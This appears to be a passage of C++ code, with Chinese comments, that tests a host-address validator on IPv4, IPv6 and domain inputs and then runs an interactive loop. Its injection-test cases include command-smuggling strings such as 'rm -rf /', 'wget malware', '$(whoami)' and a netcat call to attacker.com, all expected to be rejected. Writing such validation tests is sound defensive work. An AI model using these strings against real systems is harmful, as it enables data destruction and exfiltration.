// 测试函数
void runTests() {
    cout << "=== 主机地址验证测试 ===" << endl;
    
    vector<pair<string, bool>> testCases = {
        // IPv4 测试
        {"192.168.1.1", true},
        {"255.255.255.255", true},
        {"0.0.0.0", true},
        {"192.168.1.256", false},  // 超出范围
        {"192.168.1", false},      // 格式错误
        {"192.168.01.1", false},   // 前导零
        
        // IPv6 测试
        {"2001:0db8:85a3:0000:0000:8a2e:0370:7334", true},
        {"2001:db8:85a3::8a2e:370:7334", true},
        {"::1", true},
        {"::ffff:192.0.2.1", true},
        {"2001:db8:85a3::8a2e::7334", false}, // 多个双冒号
        
        // 域名测试
        {"google.com", true},
        {"sub.domain.example.org", true},
        {"localhost", true},
        {"test-server.company.co.uk", true},
        {"-invalid.com", false},    // 以连字符开始
        {"invalid-.com", false},    // 以连字符结束
        {".invalid.com", false},    // 以点开始
        {"invalid.com.", false},    // 以点结束
        
        // 注入攻击测试
        {"192.168.1.1; rm -rf /", false},
        {"google.com && wget malware", false},
        {"test$(whoami).com", false},
        {"host|nc attacker.com 1234", false},
        {"normal-host.com", true},
        
        // 边界情况
        {"", false},               // 空字符串
        {string(254, 'a'), false}, // 过长
    };
    
    int passed = 0;
    int total = testCases.size();
    
    for (const auto& testCase : testCases) {
        bool result = is_valid_host(testCase.first);
        bool expected = testCase.second;
        
        cout << "测试: \"" << testCase.first << "\" -> " 
             << (result ? "有效" : "无效") 
             << " (期望: " << (expected ? "有效" : "无效") << ") ";
        
        if (result == expected) {
            cout << "✓ 通过" << endl;
            passed++;
        } else {
            cout << "✗ 失败" << endl;
        }
    }
    
    cout << "\n测试结果: " << passed << "/" << total << " 通过" << endl;
}

int main() {
    // 运行测试
    runTests();
    
    cout << "\n=== 交互式测试 ===" << endl;
    cout << "请输入主机地址进行验证 (输入 'quit' 退出):" << endl;
    
    string input;
    while (true) {
        cout << "\n输入主机地址: ";
        getline(cin, input);
        
        if (input == "quit") {
            break;
        }
        
        if (is_valid_host(input)) {
            cout << "✓ 有效的主机地址" << endl;
        } else {
            cout << "✗ 无效的主机地址" << endl;
        }
    }
    
    return 0;
}
